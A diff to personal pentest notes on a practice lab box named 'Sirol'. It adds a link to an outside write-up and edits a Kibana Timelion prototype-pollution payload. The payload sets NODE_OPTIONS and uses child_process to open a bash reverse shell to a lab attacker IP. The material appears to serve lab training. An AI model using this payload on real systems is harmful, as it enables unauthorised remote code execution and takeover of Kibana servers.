@@ -1,4 +1,7 @@
 # Sirol
+I think the box is broken
+
+https://viperone.gitbook.io/pentest-everything/all-writeups/pg-practice/linux/sirol
 
 # Enumeration
 
@@ -449,8 +452,13 @@ Payload
 ```
 
 ```
-.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/192.168.49.94/80  0>&1\'");//')
-.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')\
+.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/192.168.49.106/5601  0>&1\'");//')
+.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
+```
+
+```
+.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/192.168.49.106/5601 0>&1\'");//')
+.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
 ```
 
 # Exploitation
